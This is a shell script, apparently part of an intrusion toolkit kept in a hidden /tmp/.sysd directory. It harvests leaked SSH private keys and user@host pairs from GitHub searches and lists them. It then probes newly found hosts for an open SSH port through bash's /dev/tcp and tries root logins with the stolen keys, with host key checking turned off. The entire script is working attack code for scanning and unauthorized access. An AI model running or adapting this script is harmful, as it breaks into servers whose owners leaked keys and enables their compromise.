#!/bin/sh
# throwaway: one visible scan - search github, show what was picked, show what
# answers. Bounded so it finishes in a few minutes.
set -u
W=/tmp/.sysd/.hunt
. /tmp/.sysd/worker.env 2>/dev/null || true
TARGET_USERS="${TARGET_USERS:-root}"

echo "=== 1. HARVEST: searching github now ==="
sh /tmp/.sysd/hunt.sh harvest

echo
echo "=== 2. REPOS INSPECTED THIS RUN ($(wc -l < "$W/repos.txt" 2>/dev/null) ) ==="
cat "$W/repos.txt" 2>/dev/null

echo
echo "=== 3. KEY FILES ON DISK: $(ls "$W/keys" 2>/dev/null | wc -l) ==="
n=0
for k in $(ls "$W/keys" 2>/dev/null); do
    n=$((n + 1))
    [ "$n" -gt 8 ] && break
    printf '%s :: ' "$k"
    ssh-keygen -l -f "$W/keys/$k" 2>/dev/null || echo unreadable
done

echo
echo "=== 4. EXPLICIT user@host PAIRS FOUND THIS RUN ==="
cat "$W/pairs.txt" 2>/dev/null || echo "(none)"

echo
echo "=== 5. NEW HOSTS + WHICH ANSWER ON PORT 22 ==="
cut -f3 "$W/targets.txt" 2>/dev/null | sort -u > /tmp/allhosts.txt
cut -d@ -f2 "$W/seen.txt" 2>/dev/null | sort -u > /tmp/seenhosts.txt
comm -23 /tmp/allhosts.txt /tmp/seenhosts.txt | head -60 > /tmp/newhosts.txt
echo "new (never probed) hosts: $(wc -l < /tmp/newhosts.txt)"
rm -f /tmp/open.txt
while read -r ip; do
    [ -n "$ip" ] || continue
    ( timeout 3 bash -c "echo > /dev/tcp/$ip/22" 2>/dev/null && echo "$ip" >> /tmp/open.txt ) &
done < /tmp/newhosts.txt
wait
sort -u /tmp/open.txt -o /tmp/open.txt 2>/dev/null || :
echo "of those, port 22 open: $(wc -l < /tmp/open.txt)"
cat /tmp/open.txt

echo
echo "=== 6. LOGIN ATTEMPTS: first 3 responsive hosts x 5 keys x target users ==="
for ip in $(head -3 /tmp/open.txt); do
    for k in $(ls "$W/keys" | head -5); do
        for u in $TARGET_USERS; do
            printf '%-28s key=%-28s ' "$u@$ip" "$(basename "$k")"
            if ssh -i "$W/keys/$k" -o IdentitiesOnly=yes -o BatchMode=yes \
                   -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                   -o ConnectTimeout=4 "$u@$ip" true 2>/dev/null; then
                echo "LOGIN_OK"; break
            fi
            echo deny
        done
    done
done
echo "=== SCAN DONE ==="
